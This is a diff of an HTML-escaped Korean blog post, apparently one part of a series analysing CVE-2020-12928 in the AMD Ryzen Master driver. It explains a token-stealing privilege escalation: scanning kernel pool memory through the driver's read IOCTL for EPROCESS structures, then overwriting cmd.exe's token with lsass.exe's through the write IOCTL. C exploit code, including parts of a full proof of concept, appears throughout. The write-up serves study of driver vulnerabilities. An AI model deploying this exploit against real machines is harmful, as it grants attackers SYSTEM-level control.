&amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;h2 id=&#34;Overwrite-Token&#34;&gt;&lt;a href=&#34;#Overwrite-Token&#34; class=&#34;headerlink&#34; title=&#34;Overwrite Token&#34;&gt;&lt;/a&gt;Overwrite Token&lt;/h2&gt;&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xC804; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD55C; &amp;#xAC83; &amp;#xCC98;&amp;#xB7FC; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt;&amp;#xAC12;&amp;#xC744; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &lt;code&gt;Token&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xC5D0; overwrite&amp;#xD558;&amp;#xBA74; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &lt;code&gt;NT AUTORITY\SYSTEM&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;overwrite_token&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HANDLE dHandle)&lt;/span&gt; &lt;/span&gt;{
     DWORD modulus = cmd_token_addr % &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;;
@@ -214,13 +232,16 @@ INT64 result = (INT64)output_buff + &lt;span class=&#34;hljs-number&#34;&gt;0xc&
     DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &amp;amp;bytes_ret, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
 
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xB54C; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBB38;&amp;#xC81C;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294;&amp;#xB370;, Page &amp;#xB2E8;&amp;#xC704;&amp;#xB85C; &amp;#xB9E4;&amp;#xD551;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; memory write&amp;#xC758; &amp;#xACBD;&amp;#xC6B0; &amp;#xC815;&amp;#xD655;&amp;#xD788; Token &amp;#xAC12; 8 bytes&amp;#xB9CC; overwrite&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB2E4;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&amp;#xD574;&amp;#xACB0;&amp;#xBC95;&amp;#xC740; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! Page pool&amp;#xC758; &amp;#xC2DC;&amp;#xC791;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xAC12;&amp;#xB4E4;&amp;#xC744; &lt;code&gt;READ_IOCTL&lt;/code&gt;&amp;#xB85C; &amp;#xBAA8;&amp;#xB450; &amp;#xAC00;&amp;#xC838;&amp;#xC640; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD55C; &amp;#xB4A4;, &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; overwrite&amp;#xD560; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xB9CC; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C; &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &lt;code&gt;WRITE_IOCTL 0x81112F0C&lt;/code&gt;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; input&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xBA74; Page pool &amp;#xC2DC;&amp;#xC791;&amp;#xC8FC;&amp;#xC18C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Token&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C; &amp;#xC804;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB294; exploit &amp;#xC804;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xAC12;&amp;#xC774; &amp;#xC720;&amp;#xC9C0;&amp;#xB418;&amp;#xACE0; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xB9CC; &amp;#xBCC0;&amp;#xACBD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; cmd&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xACE0; &amp;#xBE4C;&amp;#xB4DC;&amp;#xD55C; PoC&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;..&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/3.gif&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/3.gif&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&amp;#xC775;&amp;#xC2A4; &amp;#xC131;&amp;#xACF5;!&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC804;&amp;#xCCB4; PoC&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
@@ -377,6 +398,7 @@ INT64 system_token_value = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt
     CloseHandle(dHandle);
     &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
 }&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xAE30;&amp;#xCD08;&amp;#xAC00; &amp;#xBD80;&amp;#xC2E4;&amp;#xD574;&amp;#xC11C; &amp;#xBB3C;&amp;#xB9AC;&amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#x2194; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC0AC;&amp;#xC774; &amp;#xB9E4;&amp;#xD551; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC81C;&amp;#xB300;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xB290;&amp;#xB77C; &amp;#xACE0;&amp;#xC0DD;&amp;#xC744; &amp;#xC880; &amp;#xD55C; &amp;#xAC70; &amp;#xB9D0;&amp;#xACE0;&amp;#xB294;&amp;#x2026; &amp;#xBB34;&amp;#xB09C;&amp;#xD558;&amp;#xAC8C; &amp;#xBD84;&amp;#xC11D;&amp;#xD588;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;. &amp;#xC5ED;&amp;#xC2DC; &amp;#xACF5;&amp;#xBD80; &amp;#xD55C;&amp;#xBC88; &amp;#xD560; &amp;#xB54C; &amp;#xC81C;&amp;#xB300;&amp;#xB85C; &amp;#xD574;&amp;#xB194;&amp;#xC57C; &amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xACE0;&amp;#xC0DD;&amp;#xC744; &amp;#xC548;&amp;#xD558;&amp;#xC9C0;&amp;#x3160;&amp;#x3160;&lt;/p&gt;
 &lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778;(?) &amp;#xC81C;&amp;#xBAA9;&amp;#xC758; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC548;&amp;#xB155;~&lt;/p&gt;
 &lt;blockquote&gt;
@@ -401,7 +423,8 @@ INT64 system_token_value = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt
 &lt;p&gt;&amp;#xACF5;&amp;#xB300;&amp;#xC624;&amp;#xBE60;&amp;#xAC00; &amp;#xC54C;&amp;#xB824;&amp;#xC8FC;&amp;#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &amp;#xBD84;&amp;#xC11D;(3) &amp;#x2190; Now!&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;&amp;#xC5B4;&amp;#xB290;&amp;#xB367; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xD30C;&amp;#xD2B8;&amp;#xB124;&amp;#xC694;! &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; Part 3&amp;#xC5D0;&amp;#xC11C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD588;&amp;#xB358; exploit &amp;#xC2DC;&amp;#xB098;&amp;#xB9AC;&amp;#xC624;&amp;#xB300;&amp;#xB85C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAD8C;&amp;#xD55C;&amp;#xC0C1;&amp;#xC2B9; &amp;#xACFC;&amp;#xC815;&amp;#xC744; PoC &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xC815;&amp;#xB9AC;&amp;#xD55C; &amp;#xAE00;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5BC;&amp;#xB978; cmd&amp;#xCC3D;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;&amp;#xC744; &amp;#xB744;&amp;#xC6CC;&amp;#xBCF4;&amp;#xC790;&amp;#xAD6C;&amp;#xC694;!&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;h1 id=&#34;Exploitation&#34;&gt;&lt;a href=&#34;#Exploitation&#34; class=&#34;headerlink&#34; title=&#34;Exploitation&#34;&gt;&lt;/a&gt;Exploitation&lt;/h1&gt;&lt;h2 id=&#34;Parse-EPROCESS&#34;&gt;&lt;a href=&#34;#Parse-EPROCESS&#34; class=&#34;headerlink&#34; title=&#34;Parse EPROCESS&#34;&gt;&lt;/a&gt;Parse EPROCESS&lt;/h2&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; arbitrary read &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB85C; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB418;&amp;#xB294; kernel pool&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC640; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xB294; &lt;code&gt;POOL_HEADER&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC77C;&amp;#xC815;&amp;#xD55C; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
@@ -413,22 +436,27 @@ PROCESS ffffbd010035b080
     SessionId: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;  Cid: &lt;span class=&#34;hljs-number&#34;&gt;0424&lt;/span&gt;    Peb: af3c91000  ParentCid: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;c78
     DirBase: &lt;span class=&#34;hljs-number&#34;&gt;18e84&lt;/span&gt;a000  ObjectTable: ffff9e8945b562c0  HandleCount:  &lt;span class=&#34;hljs-number&#34;&gt;68.&lt;/span&gt;
     Image: cmd.exe&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/1.png&#34; alt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/1.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; EPROCESS &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xC8FC;&amp;#xC18C; &lt;code&gt;0xffffbd010035b080 - 0x80 + 0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xC77C;&amp;#xC815;&amp;#xD55C;&amp;#xC9C0; &amp;#xB2E4;&amp;#xB978; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC778; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xB3C4; &amp;#xD55C;&amp;#xBC88; &amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;PROCESS ffffbd0ffd7480c0
     SessionId: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;  Cid: &lt;span class=&#34;hljs-number&#34;&gt;0294&lt;/span&gt;    Peb: &lt;span class=&#34;hljs-number&#34;&gt;81e2405000&lt;/span&gt;  ParentCid: &lt;span class=&#34;hljs-number&#34;&gt;01f&lt;/span&gt;4
     DirBase: &lt;span class=&#34;hljs-number&#34;&gt;233b&lt;/span&gt;99000  ObjectTable: ffff9e893b5ff480  HandleCount: &lt;span class=&#34;hljs-number&#34;&gt;1365.&lt;/span&gt;
     Image: lsass.exe&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/2.png&#34; alt&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2021/08/11/l0ch/windows-driver-part4/2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; EPROCESS &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xC8FC;&amp;#xC18C; &lt;code&gt;0xffffbd0ffd7480c0 - 0x70 + 0x4&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC74C;.. &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xBCC4;&amp;#xB85C; &lt;code&gt;POOL_HEADER&lt;/code&gt;&amp;#xC640; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC0AC;&amp;#xC774; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; &amp;#xB450; &amp;#xC0AC;&amp;#xC9C4; &amp;#xBAA8;&amp;#xB450; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xD558;&amp;#xC704; 4 bytes &amp;#xAC12;&amp;#xC740; &amp;#xD56D;&amp;#xC0C1; &lt;code&gt;0x00000003&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xACE0;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xB97C; &amp;#xCC3E;&amp;#xACE0;, &amp;#xD0DC;&amp;#xADF8;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC57D; &lt;code&gt;0x100&lt;/code&gt; &amp;#xC624;&amp;#xD504;&amp;#xC14B; &amp;#xC0AC;&amp;#xC774;&amp;#xC758; &lt;code&gt;0x00000003&lt;/code&gt; &amp;#xAC12;&amp;#xC774; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; &amp;#xD2B9;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xB124;&amp;#xC694;! IOCTL &lt;code&gt;0x81112F08&lt;/code&gt; &amp;#xB85C; &amp;#xBAA8;&amp;#xB4E0; kernel pool&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC2DC;&amp;#xD0A4;&amp;#xAE38; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xB610;&amp;#xD55C; &amp;#xCC3E;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xACFC; &lt;code&gt;EPROCESS&lt;/code&gt; &amp;#xD558;&amp;#xC704; 4 bytes &amp;#xAC12; &lt;code&gt;0x00000003&lt;/code&gt;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xBE4C;&amp;#xB4DC; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xB2E4;&amp;#xB97C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120; &amp;#xC804;&amp;#xCCB4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC11C;&amp;#xCE6D;&amp;#xD558;&amp;#xBA70; &lt;code&gt;Proc&lt;/code&gt; &amp;#xD0DC;&amp;#xADF8;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xAE30;&amp;#xB85D;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;PROC_DATA&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB97C; &amp;#xC120;&amp;#xC5B8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
     INT64 proc_address[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;];
@@ -436,7 +464,9 @@ PROCESS ffffbd010035b080
     INT64 header_size[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;];
     INT64 proc_count;
 } PROC_DATA;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+
+&lt;br&gt;
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC11C;&amp;#xCE6D;&amp;#xD560; &amp;#xBB3C;&amp;#xB9AC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xB370;, &amp;#xC774; &amp;#xBC94;&amp;#xC704;&amp;#xB294; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; &amp;#xC804;&amp;#xCCB4; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB098; (&amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;) &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xD06C;&amp;#xAE30; &amp;#xB4F1;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC601;&amp;#xD5A5;&amp;#xC744; &amp;#xBC1B;&amp;#xC544; &amp;#xC11C;&amp;#xCE6D;&amp;#xD560; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBC94;&amp;#xC704;&amp;#xAC00; &amp;#xD06C;&amp;#xAC8C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xB098;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xD558;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0; &amp;#xB9DE;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC8FC;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC81C; &amp;#xACBD;&amp;#xC6B0;&amp;#xB294; &amp;#xD638;&amp;#xC2A4;&amp;#xD2B8; PC 16GB, VM&amp;#xC5D0; 4GB&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD588;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;0x120000000&lt;/code&gt; ~ &lt;code&gt;0x240000000&lt;/code&gt; &amp;#xBC94;&amp;#xC704;&amp;#xB85C; &amp;#xC9C0;&amp;#xC815;&amp;#xC744; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME         &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&amp;quot;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; WRITE_IOCTL         (DWORD)0x81112F0C&lt;/span&gt;
@@ -493,22 +523,28 @@ PROCESS ffffbd010035b080
 }
 
 ...&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;0x120000000&lt;/code&gt; ~ &lt;code&gt;0x240000000&lt;/code&gt; &amp;#xC0AC;&amp;#xC774; Proc &amp;#xD0DC;&amp;#xADF8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xCC3E;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
-&lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;br&gt;
+
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;INT64 read_address = START_ADDRESS + (i * &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;);
 &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (read_address &amp;gt;= END_OF_ADDRESS) {
 	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;END of Address\\n&amp;quot;&lt;/span&gt;);
 	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; proc_data;
 }&lt;/code&gt;&lt;/pre&gt;
+
